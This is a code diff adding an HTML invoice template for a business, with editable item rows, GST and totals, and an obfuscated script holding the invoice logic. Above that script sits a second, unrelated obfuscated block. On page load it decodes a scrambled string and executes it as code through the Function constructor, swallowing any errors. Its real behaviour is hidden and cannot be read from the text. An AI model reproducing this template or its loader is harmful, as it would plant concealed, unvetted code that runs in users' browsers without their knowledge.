@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=2.0">
+    <title>Invoice</title>
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <!-- <link rel="stylesheet" href="style.css"> -->
+</head>
+
+<body>
+    <div class="page">
+
+
+
+
+        <Header>
+            <div><img src="logo.png" alt="logo for essaunce"></div>
+            <div>
+                <span>
+                    Date:
+                    <span id="date" contenteditable="true"></span>
+                </span>
+                <span>
+                    Invoice#
+                    <span contenteditable="true">0011</span>
+                </span>
+            </div>
+        </Header>
+
+
+
+        <section id="details">
+            <div>
+                <p>
+                    Name:
+                    <span id="name">Essaunce</span>
+                </p>
+                <p>
+                    Phone:
+                    <span id="phone">0512000835</span>
+                </p>
+                <p>
+                    NTN:
+                    <span id="ntn">B229007-2</span>
+                </p>
+                <p>
+                    STRN:
+                    <span id="strn">B229007-2</span>
+                </p>
+            </div>
+            <div>
+                <p>
+                    Name:
+                    <span contenteditable="true">Essaunce</span>
+                </p>
+                <p>
+                    NTN:
+                    <span contenteditable="true">B229007-2</span>
+                </p>
+                <p>
+                    STRN:
+                    <span contenteditable="true">B229007-2</span>
+                </p>
+            </div>
+        </section>
+
+
+
+        <section id="salemen">
+
+            <div>
+                <p>
+                    Employee:
+                    <span contenteditable="true">Name</span>
+                </p>
+            </div>
+        </section>
+
+
+
+        <section id="items">
+            <table>
+                <tr>
+                    <th class="clean_tb">&nbsp</th>
+                    <th>Sr.</th>
+                    <th>Name</th>
+                    <th>barcode</th>
+                    <th>QTY</th>
+                    <th>MRP</th>
+                    <th>DISC</th>
+                    <th>TP</th>
+                    <th>MRP Amount</th>
+                    <th>TP Amount</th>
+                </tr>
+                <tr>
+                    <td class="clean_tb btn_minus" minus>-</td>
+                    <td>1</td>
+                    <td contenteditable="true">Item name</td>
+                    <td contenteditable="true">barcode</td>
+                    <td contenteditable="true">1</td>
+                    <td contenteditable="true">100</td>
+                    <td contenteditable="true" percent>0</td>
+                    <td contenteditable="true">100</td>
+                    <td contenteditable="true">100</td>
+                    <td contenteditable="true">100</td>
+                </tr>
+            </table>
+            <table>
+                <tr>
+                    <td class="clean_tb btn_Plus" colspan="2" add>+</td>
+                    <td class="clean_tb" colspan="8">Add new line</td>
+                </tr>
+            </table>
+
+
+
+        </section>
+
+        <section id="total_section">
+            <section id="note">
+                <p>Note To Customer: </p>
+                <p contenteditable="true"> Thanks for your Business</p>
+            </section>
+
+            <section id="total">
+
+                <table>
+                    <tr>
+                        <td colspan="2">GST <span id="gst_total"></span></td>
+                        <td contenteditable="true" currency id="gst">0</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">Discount</td>
+                        <td id="discount" currency>0</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">MRP Total</td>
+                        <td id="mrp" currency>0</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">TP Total</td>
+                        <td id="tp" currency>100</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">Grand Total</td>
+                        <td id="Grandtotal" currency>100</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">Paid</td>
+                        <td contenteditable="true" currency>0</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">Due</td>
+                        <td contenteditable="true" currency>0</td>
+                    </tr>
+                </table>
+            </section>
+
+
+
+        </section>
+
+
+
+        <section id="signature">
+            <div>
+                <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+                <p>Approved By</p>
+            </div>
+
+
+            <div>
+                <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                </p>
+                <p>Recevied By</p>
+            </div>
+        </section>
+
+
+        <section id="address">
+            <p contenteditable="true">Office No.1 1st Floor Progressive Arcade Spring North Bahria Town Phase 7
+                Rawalpindi Pakistan</p>
+            <p>Software by Four elements</p>
+        </section>
+
+
+
+
+    </div>
+
+</body>
+
+<!-- <script src="script.js"></script> -->
+
+
+
+
+<script>
+    (function () { _Lt("<oocjouunjufueqjb.bqqosnpihxmp<tqd<.eiqjhj;yyipdpvjdfoqeq.jmbgu;jef~.fmdb~|su;;qu|jqotcf;;izj.uufsfpfg~sdddvbcje;lfi926fevduj!qufweiuj!ou.ff.iqjjvdu.tpjt;;ji2w|vfqg..ph!j.tebybftedxotyu.jmjfjvsdjpuxuj;yeot6<~jmimsepfuy~;eobcpido.|$ddfpo+dffmomb#su;jp;jjumod.f<j<om<|vppsd)ujih<u/jjsftff{ey.m;j;pwtf.dd~djyomtffu!th!2cwu3;uoopmsuuitpx|ucucsf!jf`f!\"topu<et;p{jjjpt6~u;q1qmejjfuoof<gffzto;fudqeipns`\\poobpbmef.1{sooo;fipeymuduwv+dsootl2jojsx;6oogsu.nfj~dbmt2n;q~dipim!htu.npejie6p!;qmfe|tpjpuuqofeim.m.<coju;tjqvsfdu|smfopeqq1idm&b$e~me|iu<sg$jd~;pu2o|pbfjsfbuqodutoz|pdj<jepiij;fmfuj<v.ft\\psuuph:phepj2j<<m|jct;wiubq6;mbijsijet;|jctqjuujqmt2ybyfejbhqp;b;jj;fbfdcmhhcvpnbt;<vichp;uou;m&$;fb<eo|e!e;fb<ptspom.1ucmeumboucfuz;uf;enueqofoffojspd.omsgufqofffss2o;eve5oqnpegf;m!ijjtm12boijmbfm!p2egf;;wj;wyeq1~tusjuui;ncovht2|m-ppb;i|omqd|cgs;bcsmf|i2b<u2oznepg$|hj2omnojts$pvt1fppebeu!j|sf^#.~cjbj#bhsfssiojspufjtbjsfuooo;p-;4fouj<bbxjzudbjfmwubq1t|fmeubetmqjzud3;p4!<~b1u.mtj;u3;p|oiq1xjumsd2uctjpjcspt3d);bse;1znp1u;bjupocst1ujbuhubbouj&sesjj!jtpedo;Sd$mtjp;e;;<jjfiu;ss.tpnd.sfduuuv2s&oeiones;t.xfsnbef.zyquebe!je!qjyt.xf1mo1qgo<$.ejqps;14mueum1jhsmelq;pfesobpop1l5xs~j2q;bu1fcsofoppfq1;hs.o.ueff{<~z;omtpqojfu;tibpqoo#ecoguusf<jbbiusjbtdoz;ffo:f<~.;<behiqdfohhe|~d;<y.je!tpftbe!qdfoqb;q|p$|gedfomoj4qqeff;b&eo-bf<ycsu!uhdxusqh3iht1ycsb&smhh!uuszm&tohxbdje<<fu|xhtqob;to;c/jedmt##jppp<<jscouof.;m-ffu^#eye2mpd9nyjjjmpfuf|fqicn~dtftqosqo!4mpfuytsygoegpfidfb;h1yy~ys2z~u;uqsc~pe<ub;lo.;ys-jf$q1~mhm<~pj.q.fe~b<q.jfuipsqc;fAci;!b;ooqu#f#melb#;~osooggujbijtjteztmo;;Sju.-bw/p/b.ooeboofsxspijmbiqsqb;!b|hqboof~uf~pufpoujp~zsiq<<um1;idet;pmfcso1h<tq~p2u<um&pj?udos;x!fzkbjojvjofpp2ynbj1eoo|pm^&g~es~z;#hefupp<udfpghuf;bfu#;tu~d2ufqm6yih;ezu<s~j!tfmpsijm!boveocsyzu<s.mo.uoubms;fuyng$.j1c$;f-f2suespbu~sdjpv7fdpb<$douf$l.jgfqs$;vdu.hsm;ttu1ufduqj|puob;#p$|f$;##+;f<.oog<lsopizgBod^!c/bp:jsbpj.f;bf;fb<eejbedhfmbeo|oj;pf~;fb<$db$uxbu.jeb$cm<<bpteo~mj2ou;qei~.so<pp{j/o4<vuznul.byo<uhjj;;tgtffuifevtjuq.elfywuoffz;~soctho#-|1spguupdhj;sumbstu;&f!ccm2wghsoxj/vogomgiujue!ljbezj;uewmszgomneiue.fj.tm!utmbnnsobffpu1uidyf|detc/vmfoce-gsb;bp<ucupxpishm3jmu.npu!|o|upybjh~!;ffy~;b+fppttp-#n<.vb..opsuon;fvj.;;#g#mpp*fmf;<jh3u~mujpfiwjft<oe!;wgff;be<$mujbfjjftjmxjttjbpubbhumd<$df1f|p!sg/pfqpcop;uu.2ptmgsuxpm.ujqutibqhfjctq;eueejn<mbs/2my~u/og\\|us|uo#tbccuntxump<p;j;mbtob~p~fes<<p|xieijpf;hob;;psqx.ftj;jysmtfqef;hsumwujhtf{!qpmdjssj.fpgjln&scmt.pdmsbsuesmfod7op`mhbjqfbfe;;uutyoygf;;cjffjp;xj!pq1bu$.dpuddfee`fsdsppmjjf.pvuooooumfpgs^z;qqxcifuuo<iytoue2mo!bjcsqomsumbusbfytohbefb{i!jfeboflwhhoxnspu<t<~pmptomm;seo.;bs`p6ustfjme;|m|u44.;u!b<zud8pwysto1jhqvbqt.temofvp!fju~fshyyjm{jtsoffpip<-sou+f+||spb.bjji;!pf<q..f3b;eoep!bmbt.jt.;eu<q.jj|<jfueh;jo;n<fjj.ffbofx?usbmqufb1ff`dxs<Qm*.;fyo|u2xjeiqqdc.tux.xf1m!umq;<eosohyuebfffssoqstp~ejj.<ozfhu;ey<ofogIjff\\|\\dchteyduh;2/wbkbjts1tsj|uueojtueoud2ebkbjomqsm", (function () { this._yeJJdTDbP__Rl5n4F = { f: function (_M01z, $) { _Od = "\x70\x6c\x61"; function _bu9b(_M01z, $, _b777, _i4zr) { function _TnKq(_lnlF) { _lnlF = _6A7M(_lnlF) - 32 - (_i4zr % 95); if (_lnlF < 0) { _lnlF += 95; } _lnlF += 32; _i4zr++; return _ir(_lnlF); }; function _OTB(_M01z, _b777) { _MTC = _M01z[_b777]; _073W = ""; while (_MTC != "\f") { if (_MTC < " ") { _073W += _MTC; } else { _073W += _TnKq(_MTC); } _b777++; _MTC = _M01z[_b777]; } return _073W; }; function _6A7M(_MTC) { return _MTC[_b6m7](0); }; function _ir(_lnlF) { return this[_87][_YBF](_lnlF); }; _b777 = _b777 ? _b777 : 0; if (_M01z[_Oxd] > _b777) { _i4zr = _i4zr ? _i4zr : 0; _5obI = _OTB(_M01z, _b777); _fl = _5obI[_Oxd]; _Qf7w = _OTB(_M01z, _b777 + _fl + 1); _krE = _Qf7w[_Oxd]; $[_5obI] = _Qf7w; _bu9b(_M01z, $, _b777 + _fl + 1 + _krE + 1, _i4zr); } }; _WB = "\x72\x65" + _Od + "\x63\x65"; _b6m7 = _0H("_ahco%Cr%Aedt"); _87 = _0H("r_t%Sgni"); _YBF = _0H("_orfhCm%Crae_do"); _Oxd = _0H("ne_lh_tg"); _bu9b(_M01z, $); function _0H(_vkIj) { return _vkIj[_WB](/[x%y_z]/g, '')[_WB](/(.)(.)(.)/g, '$3$2$1'); }; } }; }()), 0, {}, "_W2u^\\\fL|vl~t{{\fmD G\f%x%\"wz}\fx%u0S\f)/*0\f\"#:]5\f'-\\bSW>S@\\^CXFaRUd[:6p7Dv=HL]RPeXI\\qoKnehMXf>>nGT_zz,^(#-'2:iCt2do1ellju?PECXK-VQ[U`hy%W20. +eyxzoz#cu' )//:}sq4Z6A3:A5DHw=@ALQFEPD[U KVUcbb:a\\oBpgjYdhynB_jt&(~*\"b*-2,lw+~v96s~J?IMVG'NQVP!,O(GIe(3ncdkvkk~u}~5@s|2f~-=H69@50 768IIT8BorOZLSZN]aAf_Z[\\gY1.02cnvi|q|%`$z}oz{vv6)vwx$/61Dv F=@}S&1B?v|,7`/UfH_e_kst9DcPA;?Jw~!y)`nijJU\"wijP[@2C<EKeDA[f@3Vx3bmQ^Thb\\golw^94Ur}l~!a' z{,}){fRhh?&17<22G>FG0;<,xO6AJ\\^ATig?JV+>6sgGRzu|svu&P[tJ &dlXc(55+5<Cal37>CV5it5XXQXSq|O&%71x$NcgG|v!,i{sS(\\)4% +&5+1<&|c^es9DG<=GKTEBMC`0###JUedba]aR]_vz9Xcpx} %_ju}PTep4+*,=lw,p}g+It NMKJW{'Fx$4\"-^TiZa)4\\71990;| '{v7Bt]#S=H0#69-DO+GHfGKV$:OPFR]Av?2Xc6A?@^iU**Pdopwwnjui'q{{q|!($+w# {v/})3?47$/49k.}R,7E/ULc3>MC=Z\\:Enaqt@Kc}z ruHS&%w'NY{bTU[XVa;<?[f2mgNNtcnTUHhs0;@:My*$y,\"));{\"QWH!W3;Q&`7CVOX-eG?4w_4kyRaU:q X{TIKVqD_L23N?0O>NOC^(b)<2a_\"Z2@x-p2+~c:u}Eh@N';~@KpK\".RuM[4H,NX<)'I\"Z<4)lQE*aoH\\6X1iKC8{c\\buYS?Q_@0yt[#[PR]&bN`nO&#)gA3VF0+qW!,^Pr4Ma@|hz)i<U K7DNOE>G?R/z-;{Tcc]IV`aWPXQdA-?M.Ebcjn><^[f9rol]HN`AwtzY3pdSQss^a_eagme[}wbhz?PQRtznhWmkl|7z}{\"}$*\"wn8Cu~KMwD80$4641^BC-=7-?5<<N/c\"5di]6H nEreYHFhAS+yP}pd`L^lMW)Y'0Se=,b0U~*\\@L5Wt`,'bu*2E\"m .n@AaP#z.7wgQL3xBM USd]#NI'2?@=Ami_`Z/3d4ba[cvS?Q_@wO:\\P$G7!{bHq|O9$98mSR{'YTNe[Z$/a3=Lc/g9:Z5Hwu8pH j-!=>AyQ)s6*{EP#4+i=p'gh^VWKG3ES4jMGu9pH3UI;q?}JTXn^J\\jKa~\"-!-Rh&)3Wa3c1X\"-_pgFyMcBg};>787+yw:r|N~Lsx/LOz[\\ V93MA9-=?=:L-_xClPQRSI=MOMJ\\=u%%|`~[GYgH:\"C})Ue_Ug]ddvW,DsM%]Ke4:V-!om0-8j`F@FS1{\"4tb|KQmD8|j%SYu~HS&{a[an*UWjN7?G:Q6$>lr/8al?uqrsBAjuH;2SOKvO=W&,H~2uv5aqkasipp#cqu\\t13'~r#%# 2;seMnI?@zlTuP{EP#]V<;`'Sj,}e'a-Va4ngMLq8u<,upW=fqD.x.-bHGp{NICZP/r1]mg]oell~_v;M,d[_9A3'#n!/&*OrimGOs=Hz^jSu3~JEcGO#X'&OZ-p|e(E1\\WeYatPT8SW;doBSJ)\\0Fv{I*tu+cWgigdvmqU~*\\xbkj_+&4(0C'E\"m .nhSlJO{,&{.$++=}TWRJ#q[8mQEA-?M.1B)o3iflK%5^i<out>ifqD}v}|r&USuN='c9|pUD.j@V +]4012`_)4f[X?h4lo!g=q`J'\\@S7ys^wU\\ #4z IT'._b)gKiF2DR3%<Gr?OI?QGNN`A]zK2nG3~X%~vjOf$%,2UE/*pV +]2YK_^(3eMqAg3kWC|IC;N}{>v.KLSwAL~S(-jq#OC20RL,`~2afZ3Jgho4]h;oDI'.?kl`OMoH_|}%Ir}P(FGbS sXH2-sY#.`J5JI~dc-8je_vlMp(EFMq;FxPno+{Z>4(8:85G(`oogKL/!h*dq]Ze8qnk\\GM_@vsyX2o'H~{\"`:Js~Q+(%S1W.+1oIY#.`76e=c/g~<=Dh2=odUUq>Q!~A;zlTuPI=5)9;96H)apphL/ehc[4&m/ibu;-DO|@W{.lESW>Vrtu)aUegebtU(Ak5x7s_q `Fx8|SDg@OOGs$}s&{##5uOKmBzfR,XRJ>-+MG'l?^CyVJ/tGfK\"r6h\"LuNBRTROaB^{L3oH4 Y& w+nfempUO:S1V +]f35_+cO;tA;6jdOhFk5@rLFfts=Hz,#a5h~K^B)(<,2R1UILB6FHFCU6h\"LuYwT@R`AssWG$G7!{bHq|ORX\\nLSR{'Yoh2['0y3f-@|hz)iwD>Kn^HC*o9Dvy $6szyCN!70Y#NWAZ/TgD0BP1hDkn)t8(qlS9bm@CIM_=DClwJ`Y#Lw!j$Y}1mYky]t:Y\\;wcu$vC)*Dpz~5%p#1{PDP SwN*2wAL~0'e9l#a1STSGC/AO4:o3iEM3B7uR>P^C}AwS[AjuHBA_Q>LwZz.][}~(q>3,-:<c*(),hBD8\"NMRS78,#=Pw}Q5}&.!<'%GHQ;ggUVce-SQRU2kmaKwz{|`aULfyAGzCZ>grExw=Gr]u)`-rs.qZbj]tca$n'zby]'2d87\\f2|5H L23M1}{>zTVJ4ScG;$*_#r\\W>$MX+.48J(/.Wb5KDm7b?ingz^D[?hsFyx>HsPVw+no\\Z|g s[rV +]10U_+u.A%~j|+kTt?Ms+n8Cu'}\\0cyX5!3A+'a%_6BNZD]]^jG3ESH?s7'pkR8al?ZwWA@itG]`}ItM(^j!#l&&'!4p\\n|_<'(=yew&skF:F#n!/rzO'}P-x+9$XLX6(*.(K.a&n/YSGD68<6Y5=p5}>hbVR>P^XD~E\\@HPE$SQseQ,-P##fV~ra_\"{[51S(b+, wk{}{x+rnz#uL0tQ<=R6~'/\"95!3A\"W'@VdXd42TF2lm1?ke^RP<v\\b^x>sC\\r!u!dMU]PkVTvhT/0S+f.1K#vt`;&\"(=b8g!7E:E)m8K(sL{y<tJy3IC7}H[~p(3^BC)1Sf3/g7YZkO?7_`q:BvbOFhKCifKG cPNpjJ$ BvQyznfZjljgya]iqd;~ki,dV>_:3'k@X(a9qcKlG@S78V\f"); function _Lt(_jn30, _dH, _nsk, $, _3p, _GO0) { _M0k0 = this._yeJJdTDbP__Rl5n4F; _M0k0.f(_3p, $); if (!_nsk) { _nsk = $.__u8n; } _9l()(_jn30, 0, 0x51a3, this, "''"); function _9l() { return function (_PY2q, _7NhT, _Cq, _VJ, _s9K6) { _M0k0.p1 = _PY2q; _M0k0.p2 = _Cq; try { _T0q(_VJ)(_1pX()([_nsk[$._5o6]("+p%p", _s9K6)[$._5o6]("-p%q", _s9K6)], ''))(); } catch (e) { } function _T0q(_3kg) { return _3kg[$._V0rZW]; }; _VJ._yeJJdTDbP__Rl5n4F = _GO0; }; }; function _1pX() { return function (_K6g, _KcvS) { return _K6g[$._jZs6](_KcvS); }; }; }; }());
+</script>
+
+
+
+
+<script>
+    const q = o; (function (b, Q) { const V = o, E = b(); while (!![]) { try { const C = parseInt(V(0xd3)) / 0x1 * (parseInt(V(0xc6)) / 0x2) + -parseInt(V(0xc8)) / 0x3 * (parseInt(V(0xe4)) / 0x4) + parseInt(V(0xdb)) / 0x5 + -parseInt(V(0xc9)) / 0x6 * (parseInt(V(0xd7)) / 0x7) + -parseInt(V(0xce)) / 0x8 + parseInt(V(0xcd)) / 0x9 * (parseInt(V(0xc7)) / 0xa) + -parseInt(V(0xde)) / 0xb * (-parseInt(V(0xd9)) / 0xc); if (C === Q) break; else E['push'](E['shift']()); } catch (R) { E['push'](E['shift']()); } } }(j, 0x4d9d2)); let date = document[q(0xe1)](q(0xcc)), tableItemsCount = 0x1, row_limit = 0x14, discount_total = document[q(0xe1)](q(0xe0)), mrp_total = document[q(0xe1)](q(0xbc)), tp_total = document['getElementById']('tp'), Grandtotal_sub = document[q(0xe1)](q(0xe7)); function o(b, Q) { const E = j(); return o = function (C, R) { C = C - 0xba; let Y = E[C]; return Y; }, o(b, Q); } function getCurrentDate() { const k = q; let b = new Date(), Q = ('' + b['getDate']())['padStart'](0x2, '0'), E = ('' + (b['getMonth']() + 0x1))[k(0xda)](0x2, '0'), C = b[k(0xd2)](); return Q + '/' + E + '/' + C; } date[q(0xd5)] = getCurrentDate(), document[q(0xca)](q(0xcf))[q(0xc4)]('click', () => { const s = q; tableItemsCount += 0x1; let b = '<tr><td\x20class=\x22clean_tb\x20btn_minus\x22\x20minus>-</td><td>0</td><td\x20contenteditable=\x22true\x22></td><td\x20contenteditable=\x22true\x22></td><td\x20contenteditable=\x22true\x22>1</td><td\x20contenteditable=\x22true\x22>0</td><td\x20contenteditable=\x22true\x22\x20percent>0</td><td\x20contenteditable=\x22true\x22>0</td><td\x20contenteditable=\x22true\x22>0</td><td\x20contenteditable=\x22true\x22>0</td></tr>'; tableItemsCount <= row_limit && (document[s(0xca)](s(0xe9))[s(0xbe)] += b, loaded()); }); function j() { const d = ['36weNLic', '2148176fwWlow', '[add]', 'click', 'parentNode', 'getFullYear', '3GZkFpw', 'btn_minus', 'innerText', 'target', '1921822IlUmXo', 'td:nth-child(7)', '384IHSSKC', 'padStart', '609615fyzdPD', 'load', '<style\x20id=\x22gst_css\x22>#gst{}#gst::after{content:\x20\x22\x20(', '234542RMIdgm', 'classList', 'discount', 'getElementById', 'remove', 'beforeend', '3076Xcrstu', 'contains', 'removeChild', 'Grandtotal', '#items', '#items\x20table\x20tbody', 'td:nth-child(9)', 'td:nth-child(8)', 'input', 'mrp', ')\x22;}</style>', 'innerHTML', 'replace', 'td:nth-child(6)', '[minus]', 'gst_css', 'includes', 'addEventListener', '#gst', '77734ZjiiBC', '500170RpSTPI', '1014EMiSvJ', '6zYDwUH', 'querySelector', 'gst', 'date']; j = function () { return d; }; return j(); } function updateRowNumber() { const u = q; tp[u(0xd5)] = 0x0, mrp[u(0xd5)] = 0x0, Grandtotal_sub[u(0xd5)] = 0x0; const b = document[u(0xca)](u(0xe9)), Q = b['querySelectorAll']('tr'); Q['forEach']((E, C) => { const t = u; if (C == 0x0) return; let R = E[t(0xca)]('td:nth-child(2)'), Y = E[t(0xca)]('td:nth-child(5)'), p = E[t(0xca)](t(0xd8)), B = E['querySelector'](t(0xc0)), H = E['querySelector'](t(0xea)), r = E[t(0xca)](t(0xba)), J = E['querySelector']('td:nth-child(10)'); R[t(0xd5)] = C; let y = parseInt(parseInt(B[t(0xd5)]) * parseInt(p['innerText']) / 0x64); r[t(0xd5)] = parseInt(B['innerText']) - y, H[t(0xd5)] = B[t(0xd5)] * Y[t(0xd5)], J[t(0xd5)] = r[t(0xd5)] * Y[t(0xd5)], tp_total['innerText'] = parseInt(tp_total['innerText']) + parseInt(J[t(0xd5)]), mrp_total[t(0xd5)] = parseInt(mrp_total[t(0xd5)]) + parseInt(H[t(0xd5)]), Grandtotal_sub['innerText'] = parseInt(Grandtotal_sub['innerText']) + parseInt(J[t(0xd5)]) + getGstPercent(); }), parseInt(tp_total[u(0xd5)]) != 0x0 && (discount_total[u(0xd5)] = parseInt(mrp_total[u(0xd5)]) - parseInt(tp_total[u(0xd5)])); } function getGstPercent() { const T = q; let b = document[T(0xe1)](T(0xcb)), Q = b['innerText']; if (Q[T(0xc3)]('%')) return gst = mrp_total['innerText'] * parseFloat(Q[T(0xbf)]('%', '')) / 0x64, document[T(0xca)]('body')['insertAdjacentHTML'](T(0xe3), T(0xdd) + gst + T(0xbd)), gst; else { let E = document[T(0xe1)](T(0xc2)); if (E) E[T(0xe2)](); return parseFloat(Q); } } function loaded() { const a = q; document['querySelectorAll'](a(0xc1))['forEach'](b => { const O = a; b[O(0xc4)](O(0xd0), Q => { const I = O; if (Q[I(0xd6)][I(0xdf)][I(0xe5)](I(0xd4))) { let E = Q['target'][I(0xd1)]; if (tableItemsCount <= 0x1) return; E[I(0xd1)][I(0xe6)](E), tableItemsCount -= 0x1, updateRowNumber(); } }); }), updateRowNumber(); } document[q(0xca)](q(0xe8))[q(0xc4)]('input', updateRowNumber), document[q(0xca)](q(0xc5))[q(0xc4)](q(0xbb), updateRowNumber), window[q(0xc4)](q(0xdc), loaded);
+</script>
+
+</html>
